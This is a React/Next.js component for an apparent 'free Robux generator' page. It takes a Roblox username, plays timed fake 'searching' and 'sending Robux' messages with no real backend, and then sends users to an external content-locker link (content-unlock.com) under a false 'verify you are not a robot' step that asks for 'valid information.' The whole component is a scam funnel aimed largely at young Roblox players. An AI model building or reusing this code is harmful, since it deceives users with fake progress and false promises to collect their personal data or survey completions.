"use client";

import { useState } from "react";

import { useRouter } from "next/navigation";
import Box3 from "./Box3";
import robuxPackages from "../../robuxPackages.json";
import additionalPackages from "../../additionalPackages.json";

const RobuxBox = () => {
  const [username, setUsername] = useState("");
  const [currentStep, setCurrentStep] = useState<
    "input" | "loading" | "box3" | "final"
  >("input");
  const [userOutput, setUserOutput] = useState("");
  const router = useRouter();

  const handleGetRobuxClick = async () => {
    if (username.length <= 2) {
      alert("Please enter a valid username");
      return;
    }

    setCurrentStep("loading");
    setUserOutput(`Searching for ${username}...`);
    setTimeout(() => {
      setCurrentStep("box3");
    }, 2500);

    // API call can be added here
    // Example:
    // try {
    //   const response = await axios.post("/api/getUser", { username });
    //   if (response.data) {
    //     setUserOutput("User found! Proceeding to Robux purchase...");
    //     setTimeout(() => {
    //       setCurrentStep("box3");
    //     }, 2500);
    //   } else {
    //     setUserOutput("User not found. Please try again.");
    //     setCurrentStep("input");
    //   }
    // } catch (error) {
    //   console.error(error);
    //   setUserOutput("Error fetching user data. Please try again.");
    //   setCurrentStep("input");
    // }
  };

  const handleRobuxClick = () => {
    setCurrentStep("loading");
    setUserOutput(`Sending Robux to ${username}...`);
    setTimeout(() => {
      setCurrentStep("final");
    }, 2500);
  };

  return (
    <div className="box_con">
      {currentStep === "input" && (
        <div className="flex flex-col justify-center">
          <h3>Roblox Username</h3>
          <div className="flex items-center gap-4">
            <input
              type="text"
              className="input-username"
              placeholder="Enter username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <button className="" onClick={handleGetRobuxClick}>
              Get Robux
            </button>
          </div>
        </div>
      )}

      {currentStep === "loading" && (
        <div className="box2">
          <div className="folding">
            <div className="sk-cube sk-cube1"></div>
            <div className="sk-cube sk-cube2"></div>
            <div className="sk-cube sk-cube3"></div>
            <div className="sk-cube sk-cube4"></div>
            <div className="square"></div>
          </div>
          <p className="useroutput">{userOutput}</p>
        </div>
      )}

      {currentStep === "box3" && (
        <Box3
          additionalPackages={additionalPackages}
          robuxPackages={robuxPackages}
          bonusItem={{
            name: "Sinister G.",
            image: "/images/pumpkin-animation.gif",
            description:
              "One bonus item per account. Refunds result in losing the item.",
            limitedTime: true,
          }}
          handleRobuxClick={handleRobuxClick}
        />
      )}

      {currentStep === "final" && (
        <div className="box4">
          <h3>Final Step!</h3>
          <p>
            Please verify that you are not a robot by answering a few questions
            to receive your Robux! Please enter valid information for the Robux
            to go through. Take your time, as completing it will grant you bonus
            Robux as a reward!
          </p>
          <button
            onClick={() =>
              router.push("https://content-unlock.com/getfreebux~623910D")
            }
            style={{ fontSize: "19px" }}
          >
            Verify
          </button>
        </div>
      )}
    </div>
  );
};

export default RobuxBox;
